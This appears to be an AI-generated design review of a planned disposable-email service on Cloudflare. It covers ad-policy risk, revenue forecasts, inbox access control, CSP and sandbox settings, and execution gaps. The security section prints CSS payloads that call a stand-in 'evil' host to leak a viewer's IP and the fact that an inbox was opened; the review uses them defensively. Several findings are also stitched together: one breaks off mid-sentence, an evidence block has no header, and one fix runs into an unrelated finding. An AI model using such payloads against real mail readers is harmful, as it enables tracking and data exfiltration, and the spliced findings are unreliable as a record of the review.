## Business-model and platform-risk realism — can this stack legally exist on the platforms it depends on, and can it earn what the plan says it earns?
VERDICT: The stack can be BUILT — and built cheaply; the seven layer designs are technically sound and the Cloudflare choices are correct and verified. The stack cannot EARN what the plan claims. The single biggest problem is not infrastructure, it is that there is no Google-monetizable surface in this product as designed: Google's AdSense ad placement policy states verbatim "Publishers may not place Google ads inside email messages. In addition, publishers may not place Google ads alongside email messages when they are the primary focus of the page" — which is precisely the inbox screen where the entire 3-8 minute session, the 35s refresh, and the 3-6 impressions/session thesis live — while the Google Publisher Policies that govern Ad Manager/AdX prohibit ads "on screens without publisher-content or with low-value content," which is where the 2,000-50,000 templated pSEO pages land. Both candidate surfaces are policy-exposed, from opposite directions. Stacked on top of that: a verified verbatim AdSense prohibition on timer-based refresh ("Publishers are not permitted to refresh a page or an element of a page without the user requesting a refresh"), a 40-55% adblock cohort, and tier-3-dominant unaddressable inventory. Realistic Year-3 gross ad revenue is $14k-36k/mo against the claimed $279k/mo — roughly 5-13% of plan, and that is BEFORE the 15-20% MCM revenue share the plan does not model. Infrastructure is a rounding error either way ($660/mo verified vs $8,950/mo claimed), so the 96.8% margin claim fails entirely on the numerator. The Cloudflare platform risk is real but hedgeable for ~$20-30/mo; the Google risk is not hedgeable at all, because Google supplies both ~50% of the category's traffic and the ad demand, and a single scaled-content determination removes both simultaneously. Separately, the adops layer's central empirical claim is factually wrong: I fetched temp-mail.org's and 10minutemail.com's live ads.txt and both carry dozens of google.com publisher IDs, not "zero."

- [blocker] The inbox screen — the only surface that produces the 3-8 minute active session the entire revenue model is built on — is a written AdSense policy violation. The doc's mitigation (sandboxed iframe isolating email HTML from ad scripts) addresses a different policy entirely and confers zero protection here.
  EVIDENCE: Fetched support.google.com/adsense/answer/1346295 (AdSense Ad placement policies) on 2026-08-27. Verbatim, under 'Ads on Emails': "Publishers may not place Google ads inside email messages. In addition, publishers may not place Google ads alongside email messages when they are the primary focus of the page." Under 'Ads in Private Communications': "Publishers may not place Google ads on screens where private communication between people is the primary focus." The same policy set also states AdSense code may not be placed in "pop-ups, emails or software" — independently confirming the api-ext layer's extension blocker. The iframe sandbox addresses ad-adjacency-to-UGC, which is a separate clause; nothing in the placement policy turns on where the HTML is rendered, only on what the page is primarily for. Counter-evidence, stated honestly: guerrillamail.com's live ads.txt carries `google.com, pub-3636152504700635, DIRECT` today, so enforcement is demonstrably lax — but that is an enforcement lottery, not a right, and 100% of the plan's revenue rides on it with no subscription floor.
  FIX: Do not underwrite the business on Google demand on the inbox route. Architect the ad stack route-split from day one (the frontend layer already recommends this): Google demand on content/utility routes ONLY, non-Google Prebid SSPs (Magnite, PubMatic, Index Exchange, Media.net, Amazon TAM, Sovrn, OneTag) on the inbox route. Then re-run the entire financial model with Google demand removed from the inbox and confirm the raise still clears. Before any Phase 3 engineering, get a written determination from a Google Ad Manager rep or a prospective MCM partner (PubGalaxy, Snigel) on whether an inbox view is 'a page where email messages are the primary focus' — this is a two-week email exercise that de-risks ten weeks of build.

- [blocker] The $2.80-$3.50 blended eCPM is indefensible, and the 79.8M impression count is itself overstated because it never applies an adblock haircut. The two errors compound. Realistic Year-3 gross ad revenue is $14k-36k/mo, centered near $22k — 5-13% of the claimed $279k/mo.

Three independent haircuts apply and the plan applies none: (1) ADBLOCK — this audience self-selects for privacy tooling; 40-55% is the defensible band versus a ~29.5% global baseline. The 79.8M figure is sessions × 3.8 with no delivery discount, so it is an ad-REQUEST count, not an impression count. (2) REFRESH — the 3.8 impressions/session requires the 35s timer, which is prohibited under AdSense (see separate finding), so during Phases 1-3 the achievable figure is ~1.5-2.0. (3) eCPM — unaddressable, zero-context, tier-3-dominant display inventory prices at $0.35-$0.90 blended, not $3.50. Corrected arithmetic: 21M sessions × 3.8 × 0.55 delivery = ~44M served impressions; at $0.55 = $24,200/mo gross; at $0.35 = $15,400; at $0.90 = $39,600. Less an 18% MCM revenue share → ~$12,600-$32,500/mo NET. Note also that the adops layer's own $43,890/mo figure is internally inconsistent: it computes affiliate revenue off '45% of sessions see an adblock fallback card' while simultaneously computing display revenue off the full 79.8M impressions — those 45% cannot both block ads and generate display impressions. Its estimate is roughly 2x optimistic within its own framework.
  FIX: Re-underwrite the plan at 21M sessions × 2.0 impressions × 50% delivery × $0.55 eCPM = ~$11,550/mo gross Year-3 display, plus $3,000-10,000/mo affiliate, and present that as the base case with $3.50 eCPM shown only as an unreachable bull. Instrument the actual impressions-per-session and adblock-rate-by-geo in Phase 1 on the 3 test domains and treat 3.8 as an OUTPUT, not an input. If the investment case does not clear at ~$15-25k/mo Year-3 gross, it does not clear.

- [blocker] Phase 3's 35s viewability-gated ad refresh — the mechanism that produces 3-6 impressions per session and therefore the entire impression forecast — is a written AdSense violation, and is only legal at all under GAM/AdX, which the plan cannot access at launch.
  EVIDENCE: Fetched support.google.com/adsense/answer/1346295 on 2026-08-27. Verbatim under 'Auto-refreshing Ads': "Publishers are not permitted to refresh a page or an element of a page without the user requesting a refresh. This includes placing ads on pages or in placements that auto-redirect or auto-refresh." There is no viewability carve-out and no minimum-interval carve-out in the AdSense text. The 30s-minimum declared-refresh regime the plan assumes exists only in Google Ad Manager, and AdX access is not obtainable by direct application from a new publisher — it runs through a Google Certified Publishing Partner or an MCM 'Manage Inventory' parent. So during Phases 1-3, when AdSense is the only available Google demand, the 35s timer is simply illegal, and the 3.8 impressions/session assumption is unreachable in exactly the window the plan needs it to fund operations.
  FIX: Rebuild the impression model on user-action triggers, which are permitted under AdSense and carry no minimum interval under GAM: generate address, copy address, open a message, delete a message, manual inbox refresh, new-mail-arrival (declare the last as event-driven, 30s minimum). This product has more legitimate refresh triggers than almost any content site. Add declared time-based refresh only after an MCM partner and AdX demand exist. Gate every refresh on document.visibilityState === 'visible' regardless, and declare every active refresh type and interval in GAM Inventory Rules — an undeclared or misdeclared refresh is itself a separate policy violation ('Dishonest declarations').

## Security, privacy and abuse
VERDICT: The spine is sound and I confirm it: Cloudflare Email Routing catch-all -> Email Worker -> per-inbox Durable Object, structurally-disabled outbound (no `send_email` binding + zero verified destination addresses), `v=spf1 -all` / `p=reject` on pool domains, drop-attachments-by-default, `setReject()` for unknown mailboxes (verified as an in-session permanent SMTP error, so it produces no backscatter), and the data layer's access-control scheme (75-bit address + separate 128-bit read token + HMAC-derived DO name + constant-time compare + indistinguishable 404 + tombstone). That scheme is the correct answer to the enumeration problem and it is better than what most incumbents ship. THE SINGLE BIGGEST PROBLEM: the access-control model is defined in one layer and structurally voided in another. The api-ext layer specifies `GET /v1/inboxes/{address}/messages` on a keyless anonymous tier with no read-token binding described anywhere. That endpoint reads any inbox by address alone. Since handing the address to a third party IS the product, the address is public by construction — so a keyless address-keyed read endpoint is a mass-OTP-disclosure API, and it is exactly the breach that has repeatedly hit this product category. No agent reconciled the two designs. Second-order: the same address-in-the-URL-path decision leaks every user's inbox address into Worker logs, Sentry, and — because GPT/Prebid derive the bid-request `page` field from `location.href` — into the bid stream of a dozen SSPs. Third: the seven agents produced four mutually incompatible iframe/CSP configurations, three of which are exploitable or self-contradictory (`allow-same-origin` is a total escape; `sandbox=""` silently breaks the verification-link flow that is the core product function; `img-src https:` / `font-src https:` re-open the exact tracking-pixel and CSS-exfiltration channels the same agents claim to block). Fix those three things and the design is defensible. Ship as-drafted and the first security incident is a stranger reading OTPs through the public API.

- [blocker] The api-ext layer's keyless, address-keyed endpoints structurally void the data layer's read-token access control, turning the public API into a mass OTP-disclosure channel. This is the single most likely breach in the whole plan.
  EVIDENCE: api-ext specifies `GET /v1/inboxes/{address}/messages`, `GET /v1/inboxes/{address}/events` (SSE) and `GET /v1/inboxes/{address}/wait?timeout=30&match=otp` on a 'keyless: no auth header, low limits, keyed on IP' tier, with Turnstile required 'only for inbox *creation*'. No read-token binding is described on any read path. Meanwhile the data layer's entire threat model rests on 'knowing the address cannot be sufficient to read the inbox, because handing the address to a third-party website is the entire product' — the address is disclosed by design to the signup site, its ESP, every logging middlebox, and every data broker downstream. A keyless read-by-address endpoint hands all of them the mailbox. The `wait?match=otp` variant is worse than a raw read: it is a purpose-built OTP-harvesting primitive that returns the parsed code with no polling logic required.
  FIX: Every read path, web and API, requires the 128-bit read token: `Authorization: Bearer <read_token>` for the API, compared in constant time against the SHA-256 stored in the inbox DO, returning an identical 404 for both 'no such inbox' and 'wrong token'. The token is minted at creation and returned once; the keyless tier may CREATE an inbox (receiving address + token in the response) but may never read one it did not create. Delete `{address}` from every read path and key reads on an opaque inbox id instead. The Tier-2 'public' user-chosen namespace is the only exception and must be a separate URL space (`/v1/public-inboxes/...`), excluded from `wait`/OTP extraction entirely, and labelled in the API docs and the UI as world-readable.

- [blocker] Putting the inbox address in the URL path or query ships every user's temp address to the ad stack. GPT and Prebid derive the bid-request page URL from `location.href`, so the address is broadcast to every SSP in the auction on every one of the 3-6 impressions per session.
  EVIDENCE: api-ext specifies `/v1/inboxes/{address}/...`; the frontend layer separately and correctly proposes `https://site/i#<address>:<read_token>` with the secret in the fragment, and the data layer's rule is 'never log full addresses (hash them)'. These are irreconcilable. The plan's own adops layer lists Magnite, PubMatic, Index Exchange, OpenX, Sovrn, Sharethrough, OneTag, Media.net and Amazon TAM as demand partners — each receives the page URL in the bid request. The address is also then present in Workers Logs, Sentry breadcrumbs, `document.referrer` on every outbound verification-link click, and the browser history of a shared device.
  FIX: Address and read token live in the URL FRAGMENT only (`#<inbox_id>:<token>`) — fragments are never sent to the server, never appear in Referer, and are not read by GPT's page-URL collection. The API keys reads on an opaque inbox id, never the address. Set `Referrer-Policy: no-referrer` site-wide. Add a CI assertion that no route pattern under `/api` or the app contains an address-shaped path segment, and a Sentry `beforeSend` plus Workers Logs scrubber that redacts anything matching an address regex or a 4-8 digit standalone code.

- [blocker] Three of the four proposed CSPs permit remote subresource loads from the email render origin, which re-enables the exact tracking-pixel and CSS-exfiltration channels the same agents claim to have blocked. `font-src https:` in particular is an unremarked read-receipt and exfiltration channel that survives every `src`-attribute rewrite described.
  EVIDENCE: The frontend layer's CSP is `img-src https: data:; font-src https: data:`; the data layer's is `img-src data: https:`; the infra layer's is `img-src https: data:`. All three sit alongside explicit statements that remote images are blocked by default. Only the mail-ingest layer gets it right (`img-src data:` plus rewriting `src`/`srcset`/`background` to `data-blocked-src`). Separately, every config carries `style-src 'unsafe-inline'` (unavoidable for email) but only mail-ingest strips `url()` from inline `style` attributes and `<style>` blocks — so under the other three, `<div style="background:url(https://evil/?i=<id>)">` fires on render and `@font-face{src:url(https://evil/f.woff)}` fires on render, neither of which is an `src` attribute and neither of which any described rewriter touches. Both leak viewer IP, User-Agent and the fact that the throwaway inbox was opened — the precise signal that gets an address harvested and a pool domain blacklisted, and a GDPR exposure on an ad-monetised page.
  FIX: One CSP, served as a response header with the framed document from the render origin, no exceptions: `default-src 'none'; script-src 'none'; style-src 'unsafe-inline'; img-src 'self' data:; font-src 'none'; form-action 'none'; base-uri 'none'; frame-ancestors https://<app-origin>; sandbox`. `img-src 'self'` permits only the first-party image proxy behind the explicit 'Show images' click. `font-src 'none'` — email needs no webfonts. The `sandbox` CSP directive is belt-and-braces: it applies independently of the parent's iframe attribute, so a mis-set attribute cannot un-sandbox the document. In the sanitizer, strip `url(`, `@import`, `expression(` and `image-set(` from both `<style>` contents and inline `style` attributes, not just from `src`-family attributes.

  EVIDENCE: Cloudflare documents that WebSocket requests are terminated automatically during shutdown, which happens on every Worker deploy. Without jittered auto-reconnect plus a REST re-sync on reconnect, the symptom is 'my code never arrived' at exactly the moment the user is watching, and the operator's first hypothesis will be a burned domain or a rejected sender.
  FIX: Jittered exponential-backoff auto-reconnect on the client, plus a `GET /messages?since=<cursor>` re-sync on every reconnect so nothing delivered during the gap is lost. Deploy the ingest Worker independently of the API Worker so an API rollback never risks mail. Use `wrangler versions upload` + `wrangler versions deploy` for gradual rollout, and schedule ingest deploys off-peak. Add the reconnect path to the Playwright suite — it is the one failure mode guaranteed to occur on every single deploy.

- [minor] Inbox content reaching Sentry, Workers Logs, Logpush or Analytics Engine silently converts a 60-minute-retention product into a 90-day-retention one, voiding both the privacy claim and the 'that data no longer exists' answer to legal process.
  EVIDENCE: Multiple layers state the rule ('never put message content in a blob', 'never log inbox addresses, message bodies, subjects, or extracted OTP codes') and none specify enforcement. In practice the leak is not a deliberate log line — it is an exception payload. A postal-mime parse failure or a sanitizer throw carries a raw MIME fragment into Sentry as the error message, and that fragment contains the sender, the subject and often the code. Sentry EU data residency is enterprise-only, so this is also an international-transfer question.
  FIX: Aggressive `beforeSend` in the Sentry SDK: drop the exception `message` and all `extra`/`breadcrumb` fields for the ingest Worker entirely, reporting only an error class, a message id and a size. Never pass the message object or any parsed field into an exception constructor. Allowlist Analytics Engine blob keys in code so a debug dimension cannot be added casually. Head-sample Workers Logs and assert in CI that no `console.log` in the ingest path takes the message object. Run an explicit end-to-end data-flow audit before launch — trace every field from `email()` to every sink — and re-run it whenever a sink is added. This is the difference between a privacy claim that survives contact with a regulator and one that does not.


## Completeness and execution fit — what is missing, what contradicts, and what does not fit 1-3 devs / $12-18k / 24 weeks
VERDICT: The seven layers are individually strong and better-researched than the plan they critique, but they were produced in isolation and do not compose into a buildable system. The single biggest problem is not a wrong technology choice — it is that nobody owns the operational product. Every specialist assumed another layer would build the admin console, the abuse queue, the support channel, the attribution join, the fixture corpus, and the approvals calendar; none did. Second: the layers directly contradict each other on three decisions that are security- or revenue-load-bearing, and each is currently "resolved" only by whichever document someone reads last — (a) api-ext's public API reads an inbox by address alone, which nullifies the read-token capability model that data and infra both treat as the #1 security control; (b) infra, seo and api-ext all mandate publishing the domain pool while data calls publishing it the cardinal operational sin; (c) frontend says Google demand may not run on the inbox route at all while adops builds the entire revenue model on inbox-surface impressions. Third: the specialists added scope faster than they cut it — two SDKs, an MCP server, a Playwright package, a Postman collection, a GitHub Action, a Haraka secondary MX, an 8-locale human translation review, a simhash CI gate and a custom rank tracker — pushing realistic scope to roughly 42-52 dev-weeks against infra's own calculation of 7.5-18 funded weeks. And the true critical path is not code at all: AdSense approval, MCM partner onboarding, Chrome Web Store review, AMO source review, GSC Bulk Export enablement (forward-only, no backfill) and a written Cloudflare acceptable-use answer are all 2-12 week external cycles, and every one of them is scheduled in the phase where it is needed rather than in week 1.

- [blocker] The public API as specified reads an inbox by address alone, which cancels the read-token capability model that two other layers identify as the single most important security control.
  EVIDENCE: api-ext specifies a keyless anonymous tier with GET /v1/inboxes/{address}/messages, /{address}/wait and /{address}/events, authenticated only by IP. data states the threat model explicitly: "knowing the address cannot be sufficient to read the inbox, because handing the address to a third-party website is the entire product" and mandates a separate 128-bit read_token plus "an identical constant-time 404" for unauthenticated reads. infra independently mandates a 128-bit bearer token whose SHA-256 hash is the only thing persisted, and states the public namespace must be "excluded from the developer API entirely". data also warns that "any future feature that lets a user open an inbox by typing the address alone (a 'check any inbox' box, a convenience API endpoint, a support tool) silently reopens the hole for every user" — the api-ext design is that endpoint.
  FIX: Make the API capability-keyed, not address-keyed: POST /v1/inboxes returns {address, read_token}; every read path requires the token, including the keyless tier (the token is issued to the anonymous caller at creation, so the no-signup funnel is preserved). Route Tier-2 public inboxes separately as /v1/public-inboxes/{localpart} so the two models can never be confused. Add a CI contract test asserting no route resolves an inbox from the address alone.

- [blocker] Three layers mandate publishing the full domain pool and one forbids it outright; the decision drives the domain burn rate, which is the plan's only unmodelled recurring operating cost.
  EVIDENCE: infra: publish "https://<brand>/domains.txt listing every pool domain, explicitly so that banks, exchanges, and identity providers can block you — and promote it". seo: ship @brand/disposable-domains "with our own domains listed". api-ext: GET /v1/domains as a public endpoint. Against that, data: "THE MOST IMPORTANT OPERATIONAL RULE, and it is a data-exposure rule: never publish the full domain list. Not in an API endpoint, not in a sitemap, not as a JSON blob in the page source... Serve 3-5 domains per request, rotated, drawn only from the already-active set." data also documents that amieiro's feed regenerates every 15 minutes and groundcat's validates candidates by MX scan, so publication converts effective domain life from months to days; seo concedes the same and flags it as "a business decision, not an engineering one" that "accelerates blacklisting and therefore the domain burn rate".
  FIX: One policy, decided by the business. The split that satisfies both goals: publish only burned/retired domains (that earns seo's citations and infra's good-citizen posture) and never publish active or warming ones; GET /v1/domains returns only the 3-5 rotated actives, matching data's rule. Then re-model the pool as a replacement rate rather than a static count — the plan's $1,100/mo line assumes 50 domains bought once, and neither figure survives a published list.

- [major] The OTP extractor cannot be built, tuned or regression-tested without retaining user mail, which the privacy posture forbids — and no layer noticed the conflict.
  EVIDENCE: mail-ingest specifies scored regex across 25 languages targeting >93% coverage, tuned per sender domain, with an offline Claude Batch job that mines new templates from "the week's extraction misses" — which requires storing the misses. data's rule is the opposite: "Never put message content in a blob. It is 3-5 days of grunt work and it is the only legally clean source. - [major] The HTML sanitizer is chosen three different ways and the layer closest to it has already flagged the choice as an unresolved go/no-go spike blocking Phase 1.
  EVIDENCE: mail-ingest picks sanitize-html 2.17.7 but states it "NEEDS A ONE-DAY SPIKE... Do not start Phase 1 without resolving this — it determines ~150 lines of security-critical code", with an HTMLRewriter allowlist as fallback and a warning that hand-rolling it "raises the bypass probability materially". data rejects sanitize-html outright ("drags htmlparser2 and is heavier than needed") and mandates HTMLRewriter. frontend and infra both pick sanitize-html; frontend adds DOMPurify 3.4.14 client-side as a second layer.   FIX: Run the spike in week 1 — bundle it, wrangler deploy --dry-run, measure CPU on a 500 KB HTML email — and let the measurement decide. Whichever wins is written once in one shared package imported by both the ingest Worker and the render Worker. Two layers shipping two sanitizers against the same hostile input is worse than either choice.

- [major] The email-render iframe contract is contradictory across four layers, and two of the four specified combinations do not actually work.
  EVIDENCE: mail-ingest: sandbox="allow-popups allow-popups-to-escape-sandbox" on content.<brand>.com, CSP img-src data: (remote images hard-blocked by default), links rewritten to an interstitial. frontend: sandbox="" with zero tokens on a separate registrable domain, CSP img-src https: data:, links "intercepted and re-rendered by the parent". data: render.<other-domain>, img-src data: https:. infra: content.<brand>.tld, img-src https: data:. With sandbox="" no link inside the frame can open at all, so frontend's design silently requires the parent to parse sanitized HTML and rebuild every anchor — a real feature nobody scoped. And three of four CSPs defeat mail-ingest's block-remote-images-by-default decision, which is a privacy-policy commitment, not a header preference.
  FIX: One ADR before Phase 1 settling three things: (a) does the frame render links itself (needs allow-popups) or does the parent rebuild them (needs sandbox="" plus a link-extraction step in the render pipeline); (b) img-src data: with an explicit "Show images" server-side proxy is the correct default for a privacy product — write it once and make the other three CSPs conform; (c) the render origin is a separate registrable domain per frontend's MDN reasoning, held off the mail rotation, with a second one at a different registrar for failover.

- [major] Routing every email link through link.<brand>.com puts an attacker-controlled redirector on the exact registrable domain that carries the SEO asset and the ad account.
  EVIDENCE: mail-ingest specifies "Rewrite every href through an interstitial at link.<brand>.com/r?u=<b64url>&sig=<hmac>". seo's central and well-argued rule is that one stable brand domain carries the website, sitemaps, docs, API, all backlinks, GSC/Bing verification and the ad units, and must never inherit the pool's reputation — it even bans rendering an inbox address as an anchor. Google Safe Browsing and SSP reputation systems act on the redirect chain, not on your HMAC signature; every phishing URL that lands in any public inbox becomes a URL under the brand's eTLD+1. adops separately notes that a Google publisher enforcement action cascades.
  FIX: Put the interstitial on its own registrable quarantine domain — the same one as the render origin is fine, since it is already quarantined — never on a brand subdomain and never on a pool domain. Keep the HMAC signature, add rel="noopener noreferrer nofollow ugc", and never prefetch or server-side-follow (mail-ingest is right that prefetching burns single-use verification links). Budget two quarantine domains at different registrars.

- [major] The secondary inbound path is specified three incompatible ways, and the most detailed version is a backup-MX spam-relay footgun that defeats the free filtering it depends on.
  EVIDENCE: mail-ingest wants Haraka on ~20% of the pool with per-domain MX hostnames in Phase 4, specifically to break the *.mx.cloudflare.net fingerprint. data wants "a secondary MX at priority 20" on every pool domain in Phase 1. infra wants 3-5 domains permanently on a second path. A priority-20 self-hosted MX alongside Cloudflare's priority-15 records does not change the domain's fingerprint at all — the Cloudflare records are still published — and backup MX records are a classic spam vector: senders deliberately target the lowest-priority MX to bypass the primary's filtering, which here means bypassing exactly the free SPF/DKIM/DMARC/RBL rejection that mail-ingest identifies as the single largest anti-abuse win of the whole architecture.
  FIX: Take mail-ingest's version: a disjoint subset of pool domains whose only MX is your own, not a backup MX sitting behind Cloudflare. The MCP server — ranked #2 for build priority, targeted at agent frameworks that sign up for services — is the same trade at larger scale: every agent that fetches an OTP over the API replaces a human who would have held a tab open for 3-8 minutes producing 3-6 impressions. api-ext also notes "API traffic is pure cost with zero ad impressions."
  FIX: Keep the API deliberately small and slow-lane (api-ext's 100 req/day keyless cap is right) and treat the API, SDKs and MCP as a link-acquisition cost centre with an explicit monthly budget, not a product line. If the MCP land-grab succeeds it must be paired with the paid tier reserved above, or success converts monetizable sessions into pure cost.

- [minor] TTL is specified four different ways and it is a published privacy commitment, not a config knob.
  EVIDENCE: The brief says 10-60 minutes. infra recommends 60 minutes with "an explicit, non-extendable ceiling" while also floating "max 24h for a 'keep longer' option". api-ext sells "TTL up to 24h" as an API-key benefit. data adds tombstone_until = expires_at + 7 days on the address claim, which means something about an expired address is retained for a week even though no content is.
  FIX: One number, in one place, in the privacy policy and enforced by the DO alarm: 60 minutes for content, 7 days for the address tombstone (claim record only, explicitly disclosed as holding no message data), no extension tier in year 1. infra's own reasoning is the tiebreaker — the short TTL is simultaneously the privacy control, the cost control and the honest answer to law-enforcement requests.

- [minor] The SERVER_SECRET used to derive Durable Object names cannot be rotated without orphaning every live inbox, and no rotation procedure exists.
  EVIDENCE: data addresses each inbox as env.INBOX.idFromName(hex(HMAC-SHA256(SERVER_SECRET, normalized_address))). Rotating the secret changes every derived id, so live objects become unreachable while still holding storage and still billing. No layer specifies a rotation cadence or procedure for this secret, the link-signing HMAC, or the API key-hashing pepper.
  FIX: It is rotatable, but only as a written procedure: rotate at the daily traffic trough, accept one TTL window (60 minutes) of orphaned inboxes, and rely on the weekly orphan sweep data already proposes for a different reason. Write the procedure now — discovering this constraint during an incident is how a team decides not to rotate a compromised secret.

- [minor] Four layers each specify their own rate limiting, with three different storage primitives and one primitive that two layers independently prove unfit for the job they assign it.
  EVIDENCE: api-ext specifies a per-key Durable Object for quota accounting because Cloudflare documents the Workers Rate Limiting binding as per-location, restricted to 10s or 60s periods, and "intentionally designed to not be used as an accurate accounting system". infra specifies a DO per /64 IPv6 or /24 IPv4 prefix for the same reason. data specifies a per-DO self-throttle at >20 auth failures/min plus a D1 counter alternative. frontend and mail-ingest each assume WAF rules, which infra's own arithmetic disqualifies across the pool ($400-1,000/mo for two IP-only rules per zone at 20-50 zones).
  FIX: One shared rate-limit package with a fixed division of labour: the Workers binding for burst only, one Durable Object keyed on identity for accurate daily quotas, one WAF rule on each brand zone, and nothing on the pool zones. Ship it as a package both the API Worker and the app Worker import.

- [minor] The single highest-value two-day feature in the product is referenced by four layers as an input and scheduled by none.
  EVIDENCE: mail-ingest identifies Cloudflare's un-disableable SPF-or-DKIM rejection as "the single worst failure mode for this product and it is invisible" and prescribes surfacing it in the UI. data ranks user-reported rejection as the earliest domain-burn signal, arriving "hours before the acceptance-rate trend is statistically visible", and says to weight it heavily. seo's entire service-page defensibility rests on the same acceptance telemetry. infra's domain state machine consumes it. No phase contains the control.
  FIX: Ship it in Phase 1 with the inbox: a "didn't get your code / this site rejected the address" control that writes domain_rejected with the domain id, offers one-click re-mint on a different domain, and surfaces any recorded SMTP rejection reason instead of an empty inbox. One control that serves as abuse intake, health signal, SEO data source and retention save simultaneously.

- [minor] Mobile is neither built nor explicitly declined, on traffic that is Android-dominant tier-3.
  EVIDENCE: adops's geo model is ~58% tier 3, anchored on Similarweb's India-dominant profile for temp-mail.org; the brief specifies mobile-first. frontend correctly rejects Web Push and the install prompt on business grounds ("it exists to let the user leave") and ships only a manifest. No layer decides whether a store listing exists, and the category incumbent has one.
  FIX: Make it an explicit no for year 1 with frontend's reasoning attached, and revisit only as a Trusted Web Activity wrapper around the existing PWA (days, not weeks) if store-search discovery proves material. Do not let a native app drift into scope — the revenue model requires a focused browser tab, and an in-app webview is a worse ad surface than the extension popup api-ext already rejected for exactly that reason.
